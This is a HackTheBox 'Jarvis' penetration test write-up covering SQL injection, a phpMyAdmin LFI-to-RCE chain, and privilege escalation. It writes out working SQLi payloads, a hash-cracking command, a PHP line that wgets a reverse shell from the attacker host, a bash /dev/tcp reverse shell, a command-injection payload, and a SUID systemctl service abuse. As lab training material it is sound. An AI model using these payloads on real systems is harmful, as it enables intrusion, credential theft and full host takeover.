# HTB Jarvis - OSCP-Style Penetration Test Report

**Author:** RandallTr

**Target:** 10.129.229.137

**Environment:** HTB (Retired Machine)

**Date:** 2025-11-13

---

## 1. High-Level Summary

A penetration test was conducted against the *Jarvis* host on the HackTheBox network. Multiple critical vulnerabilities were discovererd, including:
- SQL Injection in the `/room.php?cod=` parameter.
- Plaintest database credentials stored on the web server.
- Weak database configuration allowing SQL file reads via `LOAD_FILE()`.
- Outdated phpMyAdmin version vulnerable to authenticated LFI -> RCE.
- Privilege escalation through misconfigured `sudo` fules and a SUID `systemctl` binary.

Successful exploitation yielded:
- Remote code execution as `www-data`.
- Privilege escalation to the user `pepper`.
- Full root compromise of hte system.

All flags were retrieved.

---

## 2. Executive Recommendations

1. **Patch phpMyAdmin** to a current supported version and disable risky features such as direct SQL execution for untrusted users.
2. **Sanitize SQL input** or use prepared statements throughout the application.
3. **Remove plaintext credentials from webroot**, implement proper secrets management.
4. **Disable LOAD_FILE** and secure MySQL file privileges.
5. **Enforce strict sudo restrictions** and remove dangerous SUID binaries.
6. **Implement web application firewalls (WAF)** to mitigate SQLi and LFI attempts.

---

## 3. Methodology

A standard OSCP-aligned methodology was followed:

### 3.1 Information Gathering
- Network discovery
- Service enumeration
- Virtual host enumeration
- Directory brute forcing

### 3.2 Vulnerability Identification
- SQL injection testing
- phpMyAdmin exploit research
- MySQL privilege abuse
- SUID binary and sudo enumeration

### 3.3 Exploitation
- SQL injection to dump credentials
- phpMyAdmin authenticated LFI -> RCE
- Reverse shell deployment

### 3.4 Privilege Escalation
- Lateral movement to `pepper` via vulnerable `simpler.py`
- Full root via custom SUID `systemctl` service enumeration

---

## 4. Service Enumeration

### 4.1 Nmap Results

```
nmap -p- -T4 -sCV -oA jarvis_initial 10.129.229.137
```

Open ports:
| Port | Service | Notes |
|------|---------|-------|
| 80 | HTTP | Main web app (`supersecurehotel.htb`) |
| 64999 | HTTP | Secondary admin interface |
| 3306 | MySQL | Local DB, later used for SQLi |
| Others | - | Standard Linux services | 

Virtual hosts discovered:
```
supersecurehotel.htb
logger.htb
```
Added to `/etc/hosts/`.

Directory brute force revealed:
- `/phpmyadmin/`
- `/room.php?cod=`

---

## 5. Initial Foothold

### 5.1 SQL Injection in `room.php?cod=`

Testing revealed filtering bypassed using `ORDER BY` and `UNION` injections:
```
?cod=1'
?cod=1 ORDER BY 7
?cod=999 UNION SELECT "1","2","3","4","5","6","7" 
```
Confirmed **7 columns**.

Extracted system info using:
```
?cod=999 UNION SELECT "1","2",CONCAT_WS(':',@@version,user(),database()),"4","5","6","7" 
```

Result:
- MariaDB 10.1.48
- User: DBadmin
- DB: hotel

### 5.2 Full MySQL Enumeration

Pulled all schema names
```
(select group_concat(schema_name) from information_schema.schemata)
```

Pulled table / column names:
```
(select group_concat(table_name,':',column_name) from information_schema.columns where table_schema='hotel')

```

Dumped MySQL user table:
```
(select group_concat(host,':',user,':',password) from mysql.user)
```

Extracted hash:
```
DBadmin: *REDACTED*
```

Cracked with hashcat:
```
hashcat -a 0 -m 300 hash.txt rockyou.txt
```

**Password:** *REDACTED*

This logs into phpMyAdmin.

---

## 6. Authenticated RCE via phpMyAdmin 4.8 LFI

phpMyAdmin version was vulnerable to the well-known 2018 LFI -> RCE chain **(CVE-2018–12613)**.

### 6.1 Retrieve PHP session name

Executed:
```
select '<?php phpinfo(); ?>'
```
Found session ID in browser storage.

### 6.2 Trigger Local File Inclusion
```
http://10.129.229.137/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_<ID>
```
`phpinfo` output confirms RCE capability.

### 6.3 Deploy Reverse Shell
1. Hosted PentestMonkey PHP Reverse shell `t.php` locally.
2. Downloaded via SQL command dashboard in phpMyAdmin:
```
select '<?php exec("wget -O /var/www/html/shell.php http://10.10.14.9/t.php"); ?>'
```
3. Triggered shell:
```
http://10.129.229.137/shell.php
```
Shell obtained as www-data.

---

## 7. Privilege Escalation to User "pepper"

### 7.1 Enumerating sudo rules
Discovered sudo rules:
```
sudo -l
```

`simpler.py` located under `/var/www/Admin-Utilities/` is runnable as pepper using:
```
sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
```

### 7.2 Command injection via simpler.py

Crafted payload:
```
$(bash /tmp/shell.sh)
```

Delivered reverse shell to attacker:
```
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.9/9001 0>&1
```

Shell obtained as user pepper. Flag `user.txt` found in `/home/pepper` directory.

**User flag:** *REDACTED*

---

## 8. Privilege Escalation to Root

### 8.1 SUID systemctl Abuse

Identified unusual SUID binary:
```
find / -perm -4000 -ls 2>/dev/null
```
`/bin/systemctl` has SUID bit set.

### 8.2 Create Malicious Service File via GTFOBins
```
TF=$(mktemp).service

echo '[Service]
Type=oneshot
ExecStart=/home/pepper/shell.sh
[Install]
WantedBy=multi-user.target' > $TF
```
Copy reverse shell and service file from `/tmp` to `/home/pepper/` directory to prevent exectution failure.

### 8.3 Enable Service with SUID systemctl
```
systemctl link $TF
systemctl enable --now $TF
```
Reverse shell triggered from `/home/pepper/shell.sh`

**Root shell obtained.**

**Root flag:** *REDACTED*

---

## 9. Proofs

**User:** *REDACTED*

**Root:** *REDACTED*

---

## 10. Conclusion

The Jarvis Machine was fully compromised due to:
- A SQL injection vulnerability
- Weak database security practices
- Outdated and vulnerable phpMyAdmin installation
- Dangerous privilege escalation misconfigurations

A real-world system configured like this would be as severe risk of total compromise. Implementing the recommendations outlined earlier would significantly harden the host.